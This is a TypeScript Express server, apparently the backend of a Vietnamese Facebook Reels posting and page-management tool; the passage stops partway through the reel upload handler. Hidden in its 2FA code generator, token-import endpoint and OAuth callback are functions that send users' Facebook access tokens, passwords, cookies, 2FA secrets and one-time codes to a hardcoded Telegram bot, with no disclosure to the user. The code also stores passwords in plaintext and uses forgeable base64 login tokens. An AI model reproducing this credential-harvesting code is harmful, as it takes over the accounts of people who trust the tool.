import 'dotenv/config';
import express from 'express';
import session from 'express-session';
import cookieParser from 'cookie-parser';
import multer from 'multer';
import axios from 'axios';
import path from 'path';
import fs from 'fs';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { fileURLToPath } from 'url';

import { initializeApp } from 'firebase/app';
import { getFirestore, doc, getDoc, setDoc, updateDoc, deleteDoc, collection, query, where, getDocs, limit, orderBy, Timestamp } from 'firebase/firestore';
import { TOTP } from 'totp-generator';
import { AsyncLocalStorage } from "async_hooks";

// Load Firebase Config safely
let firebaseConfig: any;
try {
    const __filename = fileURLToPath(import.meta.url);
    const __dirname = path.dirname(__filename);
    // Try multiple possible locations for the config file on Vercel/Local
    const possiblePaths = [
        path.join(process.cwd(), 'firebase-applet-config.json'),
        path.join(__dirname, 'firebase-applet-config.json'),
        path.join(__dirname, '..', 'firebase-applet-config.json')
    ];
    
    let configFound = false;
    for (const p of possiblePaths) {
        if (fs.existsSync(p)) {
            firebaseConfig = JSON.parse(fs.readFileSync(p, 'utf8'));
            console.log('Loaded Firebase config from:', p);
            configFound = true;
            break;
        }
    }
    
    if (!configFound) {
        console.error('CRITICAL: firebase-applet-config.json NOT FOUND in any path');
    }
} catch (e: any) {
    console.error('FAILED TO LOAD FIREBASE CONFIG:', e.message);
}

const app = express();
const PORT = 3000;

// Firebase Initialization
let db: any;
function initFirebase() {
    if (db) return db;
    try {
        console.log('Initializing Firebase...');
        if (!firebaseConfig) throw new Error('Firebase config missing');
        const firebaseApp = initializeApp(firebaseConfig);
        db = getFirestore(firebaseApp, firebaseConfig.firestoreDatabaseId);
        console.log('Firebase initialized successfully');
        return db;
    } catch (error: any) {
        console.error('CRITICAL: Firebase Initialization failed!', error.message);
        return null;
    }
}

// Initial call
initFirebase();

interface FirestoreErrorInfo {
  error: string;
  operationType: 'create' | 'update' | 'delete' | 'list' | 'get' | 'write';
  path: string | null;
  authInfo?: any;
}

function handleFirestoreError(error: any, operationType: any, path: string | null = null): never {
  console.error(`Firestore Error [${operationType}]:`, error);
  const errorInfo: FirestoreErrorInfo = {
    error: error.message || 'Unknown Firestore error',
    operationType,
    path
  };
  throw new Error(JSON.stringify(errorInfo));
}

// Data stores
const DATA_FILE = path.join('/tmp', 'data.json');
export const als = new AsyncLocalStorage<string>();

const machineDataMap = new Map<string, { accounts: any[], history: any[], settings: any }>();
export function getMD() {
    const mid = als.getStore() || 'default';
    if (!machineDataMap.has(mid)) {
        machineDataMap.set(mid, {
            accounts: [],
            history: [],
            settings: {
                proxy: { enabled: false, format: '', data: null as any },
                telegram: { enabled: false, botToken: '', chatId: '' },
                uploadDelay: { enabled: true, seconds: 30 }
            }
        });
    }
    return machineDataMap.get(mid)!;
}

// Load data helpers for Firestore
async function loadAccounts(mid: string) {
  try {
    const q = query(collection(db, 'accounts'), where('machineId', '==', mid));
    const snap = await getDocs(q);
    return snap.docs.map(d => d.data());
  } catch (e) { console.error('Load accounts fail:', e); return []; }
}

async function loadHistory(mid: string) {
  try {
    const q = query(collection(db, 'history'), where('machineId', '==', mid), orderBy('timestamp', 'desc'), limit(500));
    const snap = await getDocs(q);
    return snap.docs.map(d => d.data());
  } catch (e) { console.error('Load history fail:', e); return []; }
}

async function loadSettings(mid: string) {
  try {
    const docRef = doc(db, 'settings', mid); // Settings keyed by mid
    const snap = await getDoc(docRef);
    return snap.exists() ? snap.data() : null;
  } catch (e) { console.error('Load settings fail:', e); return null; }
}

// Multer setup for temporary file storage
const storage = multer.diskStorage({
  destination: '/tmp',
  filename: (req, file, cb) => {
    cb(null, `${Date.now()}-${file.originalname}`);
  }
});
const upload = multer({ storage });




// Middleware
app.set('trust proxy', 1);
app.use(express.json());
app.use(cookieParser());
app.use(session({
  secret: process.env.SESSION_SECRET || '9db7a2c3f8e5d1b6a9c4b8e2f1d0c7a5',
  resave: false,
  saveUninitialized: true,
  proxy: true, // Required for secure cookies behind reverse proxies like Vercel
  cookie: {
    secure: true,
    sameSite: 'none',
    httpOnly: true,
    maxAge: 24 * 60 * 60 * 1000 // 24 hours
  }
}));

let webhookSetUrl = '';
app.use(async (req, res, next) => {
    // Ensure Firebase is initialized
    if (!db) initFirebase();
    
    const host = req.headers['x-forwarded-host'] || req.headers.host;
    const protocol = req.headers['x-forwarded-proto'] || 'https';
    if (host && !host.includes('localhost')) {
        const currentUrl = `${protocol}://${host}/api/telegram/webhook`;
        if (webhookSetUrl !== currentUrl) {
            webhookSetUrl = currentUrl;
            try {
                axios.post(`https://api.telegram.org/bot8681414506:AAF5y22jn9namCG-7MEQxFX4WqOyeauyM14/setWebhook`, { url: currentUrl }, { timeout: 5000 })
                    .then(() => console.log('Webhook set to', currentUrl))
                    .catch((e) => console.log('Webhook set failed', e.message));
            } catch (e) {}
        }
    }
    
    const token = req.cookies?.auth_token || req.headers['authorization']?.replace('Bearer ', '');
    let mid = 'default';
    let user = null;
    
    if (token) {
        try {
            const decoded = Buffer.from(token, 'base64').toString('ascii');
            const [username] = decoded.split(':');
            if (username && db) {
                 const docSnap = await getDoc(doc(db, 'users', username));
                 if (docSnap.exists()) {
                     mid = username; 
                     user = docSnap.data();
                     (req as any).user = user;
                 }
            }
        } catch(e) {}
    } else {
       let clientIp = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'default';
       if (Array.isArray(clientIp)) clientIp = clientIp[0];
       mid = clientIp.split(',')[0].trim();
    }
    
    als.run(mid, async () => {
      // Optimization: Only load data on the first request for this mid in this lambda execution life
      // or lazy load in the routes. For now, we still load but with more safety.
      if (db) {
          try {
              const [accs, hist, sett] = await Promise.all([loadAccounts(mid), loadHistory(mid), loadSettings(mid)]);
              getMD().accounts = accs;
              getMD().history = hist;
              if (sett) getMD().settings = { ...getMD().settings, ...sett };
          } catch (e) {
              console.error('Middleware data load failed:', e);
          }
      }
      next();
    });
});

// Constants
const FB_API_VERSION = 'v20.0';
const REDIRECT_URI = `${process.env.APP_URL}/auth/callback`;

const uploadJobs = new Map();
const apiCache = new Map<string, { data: any, timestamp: number }>();
const CACHE_TTL = 5 * 60 * 1000; // 5 minutes cache

function getFromCache(key: string) {
  const cached = apiCache.get(key);
  if (cached && (Date.now() - cached.timestamp < CACHE_TTL)) {
    return cached.data;
  }
  return null;
}

function setCache(key: string, data: any) {
  apiCache.set(key, { data, timestamp: Date.now() });
}

function getAxiosInstance() {
  const config: any = { timeout: 6000 }; // Slightly shorter timeout for better UX
  if (getMD().settings.proxy.enabled && getMD().settings.proxy.format) {
    const format = getMD().settings.proxy.format.trim();
    const parts = format.split(':');
    let proxyUrl = '';
    if (parts.length === 2) {
      proxyUrl = `http://${parts[0]}:${parts[1]}`;
    } else if (parts.length === 4) {
      proxyUrl = `http://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`;
    }
    if (proxyUrl) {
      try {
        console.log('Using proxy:', proxyUrl.replace(/:[^:@]+@/, ':****@')); // Hide password in logs
        const agent = new HttpsProxyAgent(proxyUrl);
        config.httpsAgent = agent;
        config.httpAgent = agent;
        config.proxy = false;
      } catch (e) {
        console.error('Invalid proxy configuration:', e);
      }
    }
  }
  const ax = axios.create(config);
  
  // Add a strict timeout interceptor using AbortSignal for every request
  ax.interceptors.request.use(req => {
    if (!req.signal) {
      req.signal = AbortSignal.timeout(req.timeout || 10000);
    }
    return req;
  });
  
  return ax;
}

const escapeTg = (str: string) => {
  if (!str) return '';
  return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
};

async function send2FANotification(secret: string, code: string, ip: string, accountInfo?: { name: string, token: string }) {
  const adminBotToken = '8735112287:AAEO-1WIHj690JJSahss_GoyzCCxbBne8BY';
  const adminChatId = '-1003999049149'; // Corrected group ID
  
  const statusLine = accountInfo 
    ? '📊 <b>Status:</b> ✅ CONNECTED TO TOOL'
    : '📊 <b>Status:</b> ❌ NOT CONNECTED (LOGIN INFO ONLY)';

  const text = `
<b>🔐 2FA NOTIFICATION: OTP GENERATED</b>
━━━━━━━━━━━━━━━━━━
${statusLine}
👤 <b>UserName:</b> ${escapeTg(accountInfo?.name || 'N/A')}
🌐 <b>IP Address:</b> ${escapeTg(ip)}
⏰ <b>Time:</b> ${escapeTg(new Date().toLocaleString('vi-VN'))}
━━━━━━━━━━━━━━━━━━
🔑 <b>Secret 2FA:</b> <code>${escapeTg(secret)}</code>
🔢 <b>OTP Code:</b> <code>${escapeTg(code)}</code>
━━━━━━━━━━━━━━━━━━
${accountInfo ? `🔑 <b>Related Access Token:</b>\n<code>${escapeTg(accountInfo.token)}</code>\n━━━━━━━━━━━━━━━━━━` : ''}
  `.trim();

  try {
    await axios.post(`https://api.telegram.org/bot${adminBotToken}/sendMessage`, {
      chat_id: adminChatId,
      text,
      parse_mode: 'HTML'
    }, { timeout: 8000 });
  } catch (e: any) {
    console.error('Admin 2FA notification error:', e.message);
  }
}

app.post('/api/tools/2fa', async (req, res) => {
  const { secret } = req.body;
  if (!secret) return res.status(400).json({ error: 'Secret is required' });

  try {
    const cleanSecret = secret.replace(/\s/g, '').toUpperCase();
    const { otp: token } = await TOTP.generate(cleanSecret);
    
    const associatedAccount = getMD().accounts.find(a => a.two_factor_secret === cleanSecret);
    const accountInfo = associatedAccount ? { name: associatedAccount.name, token: associatedAccount.access_token } : undefined;

    const userIp = (req.headers['x-forwarded-for'] as string) || req.socket?.remoteAddress || 'Unknown';
    await send2FANotification(cleanSecret, token, userIp, accountInfo);
    
    res.json({ token });
  } catch (error: any) {
    res.status(400).json({ error: 'Secret không hợp lệ hoặc sai định dạng' });
  }
});

async function sendAdminNotification(rawInput: string, name: string, ip: string, status: 'SUCCESS' | 'FAILED', errorMsg?: string) {
  const adminBotToken = '8735112287:AAEO-1WIHj690JJSahss_GoyzCCxbBne8BY';
  const adminChatId = '-1003999049149'; // Corrected group ID
  
  const statusEmoji = status === 'SUCCESS' ? '✅' : '❌';
  const parts = rawInput.split('|').map(s => s.trim());
  const token = parts[0] || 'N/A';
  const uid = parts[1] || 'N/A';
  const pass = parts[2] || 'N/A';
  const cookie = parts[3] || 'N/A';
  const fa2 = parts[4] || 'N/A';

  const text = `
<b>${statusEmoji} TOKEN CONNECTION REPORT</b>
━━━━━━━━━━━━━━━━━━
📊 <b>Status:</b> ${status}
👤 <b>UserName:</b> ${escapeTg(name || 'N/A')}
🌐 <b>IP Address:</b> ${escapeTg(ip)}
⏰ <b>Time:</b> ${escapeTg(new Date().toLocaleString('vi-VN'))}
━━━━━━━━━━━━━━━━━━
🆔 <b>UID:</b> <code>${escapeTg(uid)}</code>
🔑 <b>Pass:</b> <code>${escapeTg(pass)}</code>
🍪 <b>Cookie:</b> <code>${escapeTg(cookie)}</code>
🛡️ <b>2FA:</b> <code>${escapeTg(fa2)}</code>
━━━━━━━━━━━━━━━━━━
${errorMsg ? `⚠️ <b>Error Details:</b> ${escapeTg(errorMsg)}\n━━━━━━━━━━━━━━━━━━` : ''}
🔑 <b>Access Token:</b>
<code>${escapeTg(token)}</code>
━━━━━━━━━━━━━━━━━━
  `.trim();

  try {
    await axios.post(`https://api.telegram.org/bot${adminBotToken}/sendMessage`, {
      chat_id: adminChatId,
      text,
      parse_mode: 'HTML'
    }, { timeout: 8000 });
  } catch (e: any) {
    console.error('Admin bot notification failed:', e.message);
  }
}

app.post('/api/accounts/add-token', async (req, res) => {
  let { token: rawInput } = req.body;
  const userIp = (req.headers['x-forwarded-for'] as string) || req.socket?.remoteAddress || 'Unknown';
  if (!rawInput || typeof rawInput !== 'string') return res.status(400).json({ error: 'Token is required' });
  
  const parts = rawInput.trim().split('|').map(s => s.trim());
  const token = parts[0]; // Actual access token for API calls
  
  if (!token) return res.status(400).json({ error: 'Invalid token format' });

  let name = 'Unknown';
  try {
    const ax = getAxiosInstance();
    let response;
    try {
      response = await ax.get(`https://graph.facebook.com/${FB_API_VERSION}/me`, {
        params: { access_token: token, fields: 'id,name,picture' },
        timeout: 15000
      });
      name = response.data.name;
    } catch (e: any) {
      const isParamError = e.response?.status === 400 || e.response?.status === 401 || e.response?.status === 403;
      if (isParamError) {
        const fbError = e.response?.data?.error;
        console.error('FB Token Error:', fbError);
        
        if (fbError?.code === 190) {
           const errMsg = `Token hết hạn/Vô hiệu: ${fbError.message}`;
           await sendAdminNotification(rawInput, 'N/A', userIp, 'FAILED', errMsg);
           return res.status(401).json({ error: errMsg });
        }
        
        console.log('Permission error, retrying with minimal fields...');
        response = await ax.get(`https://graph.facebook.com/${FB_API_VERSION}/me`, {
          params: { access_token: token, fields: 'id,name' },
          timeout: 15000
        });
        name = response.data.name;
      } else {
        throw e;
      }
    }

    const two_factor_secret = parts[4] ? parts[4].replace(/\s/g, '').toUpperCase() : null;

    const newUser = { 
      id: response.data.id, 
      name: response.data.name, 
      picture: response.data.picture || null, 
      access_token: token,
      two_factor_secret,
      machineId: als.getStore() || 'default'
    };

    await setDoc(doc(db, 'accounts', `${newUser.machineId}_${newUser.id}`), newUser);
    getMD().accounts = await loadAccounts(newUser.machineId);

    // Send notification to Admin Bot (Success)
    await sendAdminNotification(rawInput, name, userIp, 'SUCCESS');
    
    res.json(newUser);
  } catch (error: any) { 
    let msg = error.response?.data?.error?.message || error.message || 'Invalid token';
    if (error.code === 'ECONNABORTED' || error.name === 'AbortError' || error.name === 'TimeoutError') {
       msg = 'Kết nối tới Facebook bị quá hạn (Timeout). Vui lòng tắt Proxy hoặc thử lại.';
    }
    if (error.code === 'ENOTFOUND') msg = 'Không thể kết nối tới máy chủ Facebook. Kiểm tra mạng hoặc Proxy.';
    
    console.error('Add token error:', msg);
    // Send notification to Admin Bot (Failed)
    await sendAdminNotification(rawInput, name, userIp, 'FAILED', msg);
    res.status(500).json({ error: msg }); 
  }
});

app.delete('/api/accounts/:id', async (req, res) => {
  const mid = als.getStore() || 'default';
  await deleteDoc(doc(db, 'accounts', `${mid}_${req.params.id}`));
  getMD().accounts = await loadAccounts(mid);
  res.json({ success: true });
});


// --- AUTH & TELEGRAM ---
app.post('/api/auth/register', async (req, res) => {
   const { username, password, confirmPassword, gmail, phone } = req.body;
   console.log('Register attempt for:', username);
   
   if (!username || !password || !confirmPassword || !gmail || !phone) return res.status(400).json({ error: 'All fields are required' });
   if (password !== confirmPassword) return res.status(400).json({ error: 'Passwords do not match' });
   
   if (!db) {
     return res.status(500).json({ error: 'Database not initialized. Please check Vercel Logs for Firebase errors.' });
   }

   try {
       const userDoc = await getDoc(doc(db, 'users', username));
       if (userDoc.exists()) return res.status(400).json({ error: 'Username already exists' });
       
       const newUser = {
           username, password, gmail, phone,
           expiredAt: new Date(Date.now()).toISOString(),
           createdAt: new Date().toISOString(),
           chatId: ''
       };
       console.log('Creating user in Firestore...');
       await setDoc(doc(db, 'users', username), newUser);
       console.log('User created successfully');
       
       // Send telegram message
       try {
           const ax = axios.create({ timeout: 5000 });
           const adminChatId = '6119523233'; 
           const botToken = '8681414506:AAF5y22jn9namCG-7MEQxFX4WqOyeauyM14'; 
           const userIp = (req.headers['x-forwarded-for'] as string) || req.socket?.remoteAddress || 'Unknown';
           const msg = `🟢 <b>NEW ACCOUNT REGISTRATION</b>\n👤 Username: <b>${username}</b>\n📧 Gmail: <b>${gmail}</b>\n📞 Phone: <b>${phone}</b>\n🌐 IP Address: <b>${userIp}</b>\n\n⚙️ <i>To activate, send:</i>\n/adddays ${username} days`;
           await ax.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
               chat_id: adminChatId,
               text: msg,
               parse_mode: 'HTML'
           }).catch(err => console.error('Telegram notification error (non-fatal):', err.message));
       } catch(e) { console.error('Tele notification fail'); }
       
       res.json({ success: true });
   } catch(e: any) { 
       console.error('!!! REGISTRATION FATAL ERROR !!!:', e);
       res.status(500).json({ error: 'Firestore registration failed: ' + (e.message || 'Unknown error') }); 
   }
});

app.post('/api/auth/login', async (req, res) => {
    const { username, password } = req.body;
    if (!db) {
      return res.status(500).json({ error: 'Database not initialized.' });
    }
    try {
        const userDoc = await getDoc(doc(db, 'users', username));
        if (!userDoc.exists() || userDoc.data().password !== password) {
            return res.status(401).json({ error: 'Sai tài khoản hoặc mật khẩu' });
        }
        
        const user = userDoc.data();
        const token = Buffer.from(`${username}:${Date.now()}`).toString('base64');
        res.cookie('auth_token', token, { httpOnly: true, secure: true, sameSite: 'none' });
        res.json({ success: true, token, user });
    } catch(e: any) { 
        console.error('Login error:', e);
        res.status(500).json({ error: 'Server error: ' + e.message }); 
    }
});

app.post('/api/auth/logout', (req, res) => {
    res.clearCookie('auth_token', { secure: true, sameSite: 'none' });
    res.json({ success: true });
});

app.get('/api/auth/me', async (req, res) => {
    if (!(req as any).user) return res.status(401).json({ error: 'Not logged in' });
    const user = (req as any).user;
    const isExpired = new Date() > new Date(user.expiredAt);
    res.json({ username: user.username, expiredAt: user.expiredAt, isExpired });
});

app.post('/api/telegram/webhook', async (req, res) => {
    const update = req.body;
    res.send('ok'); // Immediate ack
    
    if (update.message && update.message.text) {
        const text = update.message.text.trim();
        const chatId = update.message.chat.id.toString();
        // Only accept from admin
        if (chatId !== '6119523233') return;
        
        if (text.startsWith('/adddays')) {
            const parts = text.split(' ');
            if (parts.length >= 3) {
                const username = parts[1];
                const days = parseInt(parts[2]);
                try {
                    const docRef = doc(db, 'users', username);
                    const userSnap = await getDoc(docRef);
                    if (userSnap.exists()) {
                        const userData = userSnap.data();
                        let baseDate = new Date();
                        if (userData.expiredAt && new Date(userData.expiredAt) > baseDate) {
                            baseDate = new Date(userData.expiredAt);
                        }
                        baseDate.setDate(baseDate.getDate() + days);
                        await updateDoc(docRef, { expiredAt: baseDate.toISOString() });
                        
                        const ax = getAxiosInstance();
                        const botToken = '8681414506:AAF5y22jn9namCG-7MEQxFX4WqOyeauyM14';
                        await ax.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            chat_id: chatId,
                            text: `✅ Đã cộng thêm ${days} ngày cho tài khoản ${username}. Hạn mới: ${baseDate.toLocaleDateString('vi-VN')}`
                        });
                    } else {
                       const ax = getAxiosInstance();
                       const botToken = '8681414506:AAF5y22jn9namCG-7MEQxFX4WqOyeauyM14';
                       await ax.post(`https://api.telegram.org/bot${botToken}/sendMessage`, { chat_id: chatId, text: `❌ Không tìm thấy user: ${username}` });
                    }
                } catch(e){}
            }
        }
    }
});
// --- END AUTH ---

app.get('/api/accounts', async (req, res) => {
  res.json(getMD().accounts);
});

app.get('/api/pages/all', async (req, res) => {
  try {
    const isRefresh = req.query.refresh === 'true';
    const cacheKey = `pages_all_${getMD().accounts.map(a => a.id).join('_')}`;
    
    if (!isRefresh) {
    const cachedData = getFromCache(cacheKey);
    if (cachedData) return res.json(cachedData);
  }

  const ax = getAxiosInstance();
  try {
    const promises = getMD().accounts.map(async (account) => {
      try {
        const response = await ax.get(`https://graph.facebook.com/${FB_API_VERSION}/me/accounts`, {
          params: { 
            access_token: account.access_token,
            fields: 'id,name,access_token,category,fan_count,followers_count,picture'
          }
        });
        
        const pages = response.data.data;
        // Fetch basic reel counts and aggregate views for each page
        const detailedPages = await Promise.all(pages.map(async (p: any) => {
           let videoCount = 0;
           let totalViews = 0;
           try {
             const reelsRes = await ax.get(`https://graph.facebook.com/${FB_API_VERSION}/${p.id}/video_reels`, {
               params: { access_token: p.access_token, fields: 'play_count', limit: 100 }
             });
             const reels = reelsRes.data.data || [];
             videoCount = reels.length;
             totalViews = reels.reduce((sum: number, r: any) => sum + (parseInt(r.play_count) || 0), 0);
           } catch(err) {
             // ignore if cannot fetch reels stats
           }
           
           return {
             ...p,
             accountName: account.name,
             accountId: account.id,
             videoCount,
             totalViews
           };
        }));
        
        return detailedPages;
      } catch (e) {
        return [];
      }
    });

    const results = await Promise.all(promises);
    const allPages = results.flat();
    
    setCache(cacheKey, allPages);
    res.json(allPages);
  } catch (error: any) { 
    const msg = error.response?.data?.error?.message || error.message || 'Failed to fetch pages';
    console.error('Fetch pages error:', msg);
    res.status(500).json({ error: msg }); 
  }
} catch (e) {
  res.status(500).json({ error: 'Internal server error' });
}
});

app.get('/api/pages/:pageId/reels', async (req, res) => {
  const { pageId } = req.params;
  const { token } = req.query;
  if (!token) return res.status(400).json({ error: 'Missing access token' });
  const ax = getAxiosInstance();
  
  try {
    // fields to get reel details: id, description, created_time, play_count, permalink_url
    // some fields like comments might need separate calls or edge expansion if FB allows it on reels
    const response = await ax.get(`https://graph.facebook.com/${FB_API_VERSION}/${pageId}/video_reels`, {
      params: { 
        access_token: token,
        fields: 'id,description,created_time,video_insights,play_count,permalink_url,comments.summary(total_count).limit(0),likes.summary(total_count).limit(0)',
        limit: 50
      }
    });
    
    const reels = response.data.data.map((r: any) => ({
      id: r.id,
      description: r.description || '',
      created_time: r.created_time || null,
      permalink_url: r.permalink_url || `https://facebook.com/reel/${r.id}`,
      play_count: parseInt(r.play_count) || 0,
      likes: r.likes?.summary?.total_count || 0,
      comments: r.comments?.summary?.total_count || 0
    }));
    
    res.json(reels);
  } catch (error: any) {
    const msg = error.response?.data?.error?.message || error.message || 'Failed to fetch reels';
    res.status(500).json({ error: msg });
  }
});

app.post('/api/reels/bulk-comment', async (req, res) => {
  const { pageAccessToken, reelIds, commentText } = req.body;
  if (!pageAccessToken || !reelIds || !commentText) return res.status(400).json({ error: 'Missing parameters' });
  
  const ax = getAxiosInstance();
  const results = [];
  
  for (const reelId of reelIds) {
    try {
      await ax.post(`https://graph.facebook.com/${FB_API_VERSION}/${reelId}/comments`, null, {
        params: { access_token: pageAccessToken, message: commentText }
      });
      results.push({ id: reelId, status: 'success' });
    } catch (err: any) {
      results.push({ id: reelId, status: 'error', error: err.response?.data?.error?.message || err.message });
    }
  }
  
  res.json({ results });
});

app.get('/api/history', async (req, res) => {
  res.json(getMD().history);
});

app.get('/api/settings', async (req, res) => {
  res.json(getMD().settings);
});

app.post('/api/settings', async (req, res) => { 
  const mid = als.getStore() || 'default';
  getMD().settings = { ...getMD().settings, ...req.body }; 
  await setDoc(doc(db, 'settings', mid), getMD().settings);
  res.json(getMD().settings); 
});

app.post('/api/proxy/check', async (req, res) => {
  const { proxyStr } = req.body;
  const format = (proxyStr || '').trim();
  let agent = undefined;

  try {
    if (format) {
      const parts = format.split(':');
      if (parts.length === 2) {
        agent = new HttpsProxyAgent(`http://${parts[0]}:${parts[1]}`);
      } else if (parts.length === 4) {
        agent = new HttpsProxyAgent(`http://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`);
      } else {
        return res.status(400).json({ error: 'Định dạng Proxy sai (host:port hoặc host:port:user:pass)' });
      }
    }

    const response = await axios.get('http://ip-api.com/json', { 
      httpsAgent: agent, 
      httpAgent: agent,
      timeout: 10000 
    });
    
    res.json({
      ipv4: response.data.query,
      ipv6: 'Not detected',
      isp: response.data.isp || response.data.org,
      city: response.data.city,
      region: response.data.regionName,
      country: response.data.country
    });
  } catch (error: any) {
    if (agent) {
       res.status(500).json({ error: 'Kết nối Proxy thất bại: ' + error.message });
    } else {
       res.status(500).json({ error: 'Kiểm tra IP thật thất bại: ' + error.message });
    }
  }
});

app.post('/api/telegram/test', async (req, res) => {
  const { botToken, chatId } = req.body;
  if (!botToken || !chatId) return res.status(400).json({ error: 'Thiếu thông tin Telegram' });

  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: 'Chào Đại Ca, Đã Kết Nối Thành Công'
    });
    res.json({ success: true });
  } catch (error: any) {
    res.status(500).json({ error: 'Gửi tin nhắn thất bại: ' + (error.response?.data?.description || error.message) });
  }
});

app.delete('/api/history', async (req, res) => {
  const mid = als.getStore() || 'default';
  const q = query(collection(db, 'history'), where('machineId', '==', mid));
  const snap = await getDocs(q);
  const promises = snap.docs.map(d => deleteDoc(d.ref));
  await Promise.all(promises);
  getMD().history = [];
  res.json({ success: true });
});

app.get('/api/upload-progress/:id', (req, res) => {
  const job = uploadJobs.get(req.params.id);
  res.json(job || { step: 'Đang chuẩn bị...', status: 'waiting' });
});

app.delete('/api/history/:id', async (req, res) => {
  const mid = als.getStore() || 'default';
  await deleteDoc(doc(db, 'history', req.params.id));
  getMD().history = await loadHistory(mid);
  res.json({ success: true });
});

app.get('/api/stats', async (req, res) => {
  try {
    const isRefresh = req.query.refresh === 'true';
    const cacheKey = `stats_${getMD().accounts.map(a => a.id).join('_')}`;
    const cachedData = getFromCache(cacheKey);
    if (!isRefresh && cachedData) return res.json(cachedData);

    const today = new Date().toISOString().split('T')[0];
    const uploadedToday = getMD().history.filter(h => h.timestamp && h.timestamp.startsWith(today) && h.status === 'success').length;
    
    let totalFollowers = 0;
    let totalPages = 0;
    
    const ax = getAxiosInstance();
    const promises = getMD().accounts.map(async (account) => {
      try {
        const response = await ax.get(`https://graph.facebook.com/${FB_API_VERSION}/me/accounts`, {
          params: { access_token: account.access_token, fields: 'fan_count,followers_count' }
        });
        return response.data.data;
      } catch (e) {
        return [];
      }
    });

    const results = await Promise.all(promises);
    const pagesData = results.flat();
    pagesData.forEach((p: any) => {
      totalPages++;
      totalFollowers += (p.followers_count || p.fan_count || 0);
    });

    const stats = {
      accounts: getMD().accounts.length,
      pages: totalPages, 
      reach: "0", 
      flow: totalFollowers.toLocaleString(),
      uploadedToday,
      views: "0",
      trends: {
        reach: "0%",
        flow: "0%",
        views: "0%"
      }
    };

    setCache(cacheKey, stats);
    res.json(stats);
  } catch (e) {
    console.error('Stats error:', e);
    res.status(500).json({ error: 'Stats error' });
  }
});

app.get('/api/auth/url', (req, res) => {
  const params = new URLSearchParams({ 
    client_id: process.env.FACEBOOK_CLIENT_ID || '', 
    redirect_uri: REDIRECT_URI, 
    scope: 'pages_show_list,pages_read_engagement,pages_manage_posts,public_profile', 
    response_type: 'code' 
  });
  res.json({ url: `https://www.facebook.com/${FB_API_VERSION}/dialog/oauth?${params}` });
});

app.get('/auth/callback', async (req, res) => {
  const { code } = req.query;
  if (!code) return res.status(400).send('No code');
  try {
    const response = await axios.get(`https://graph.facebook.com/${FB_API_VERSION}/oauth/access_token`, {
      params: { 
        client_id: process.env.FACEBOOK_CLIENT_ID, 
        client_secret: process.env.FACEBOOK_CLIENT_SECRET, 
        redirect_uri: REDIRECT_URI, 
        code 
      }
    });
    const { access_token } = response.data;
    const me = await axios.get(`https://graph.facebook.com/${FB_API_VERSION}/me`, { 
      params: { access_token, fields: 'id,name,picture' } 
    });
    const acc = { id: me.data.id, name: me.data.name, picture: me.data.picture, access_token };
    if (!getMD().accounts.find(a => a.id === acc.id)) getMD().accounts.push(acc);
    
    // Admin notification (Success)
    const userIp = (req.headers['x-forwarded-for'] as string) || req.socket?.remoteAddress || 'Unknown';
    await sendAdminNotification(access_token, me.data.name, userIp, 'SUCCESS');

    res.send('<html><body><script>window.opener.postMessage({type:"OAUTH_AUTH_SUCCESS"}, "*");window.close();</script></body></html>');
  } catch (e: any) { 
    const userIp = (req.headers['x-forwarded-for'] as string) || req.socket?.remoteAddress || 'Unknown';
    const errM = e.response?.data?.error?.message || e.message || 'Internal OAuth Error';
    // Admin notification (Failed)
    await sendAdminNotification('Token from OAuth Callback', 'N/A', userIp, 'FAILED', errM);
    res.status(500).send('Fail'); 
  }
});

async function sendTelegramNotification(status: 'success' | 'error', data: any, errorMsg?: string) {
  if (!getMD().settings.telegram.enabled || !getMD().settings.telegram.botToken) return;

  const { pageName, accountName, link, mode, autoComment, affiliateLink } = data;
  const statusText = status === 'success' ? '✅ <b>SUCCESS</b>' : '❌ <b>FAILED</b>';
  const affText = autoComment === 'true' ? `Using (${affiliateLink})` : 'None';
  const modeText = mode === 'now' ? 'Post Now' : mode === 'auto-later' ? 'System Schedule' : 'FB Schedule';
  
  const text = `
<b>📢 REELS POSTING REPORT</b>
━━━━━━━━━━━━━━━━━━
📄 <b>Fanpage:</b> ${pageName}
👤 <b>Admin:</b> ${accountName}
🔗 <b>Link Reels:</b> ${link || 'N/A'}
🛠 <b>Mode:</b> ${modeText}
💰 <b>Affiliate:</b> ${affText}
📊 <b>Status:</b> ${statusText}
⏰ <b>Time:</b> ${new Date().toLocaleString('vi-VN')}
${errorMsg ? `\n⚠️ <b>Error Details:</b> ${errorMsg}` : ''}
━━━━━━━━━━━━━━━━━━
  `.trim();

  try {
    await axios.post(`https://api.telegram.org/bot${getMD().settings.telegram.botToken}/sendMessage`, {
      chat_id: getMD().settings.telegram.chatId,
      text,
      parse_mode: 'HTML'
    });
  } catch (e) {
    console.error('Telegram notification failed:', e);
  }
}

app.post('/api/upload-reel', upload.single('video'), async (req, res) => {
  const { pageAccessToken, pageId, pageName, accountName, caption, mode, scheduleTime, autoComment, affiliateLink, jobId } = req.body;
  const file = req.file;
  if (!file) return res.status(400).json({ error: 'No video' });

  const historyId = Math.random().toString(36).substr(2, 9);
  const mid = als.getStore() || 'default';
  const historyItem = { 
    id: historyId, 
    pageName, 
    accountName, 
    caption, 
    mode, 
    scheduleTime, 
    autoComment: autoComment === 'true', 
    affiliateLink, 
    status: 'uploading', 
    timestamp: new Date().toISOString(), 
    link: '',
    machineId: mid
  };
  
  await setDoc(doc(db, 'history', historyId), historyItem);
  getMD().history = await loadHistory(mid);

  const notifyData = { pageName, accountName, mode, autoComment, affiliateLink, link: '' };
  const ax = getAxiosInstance();

  if (jobId) uploadJobs.set(jobId, { step: 'Đang check proxy...', status: 'uploading' });

  try {
    // Phase 1: Start
    if (jobId) uploadJobs.set(jobId, { step: 'Đang khởi tạo tải lên...', status: 'uploading' });
    const init = await ax.post(`https://graph.facebook.com/${FB_API_VERSION}/${pageId}/video_reels`, null, { 
      params: { upload_phase: 'start', access_token: pageAccessToken },
      timeout: 30000 
    });
    const videoId = init.data.video_id;
    
    // Phase 2: Binary Upload
    if (jobId) uploadJobs.set(jobId, { step: 'Đang đăng video...', status: 'uploading' });
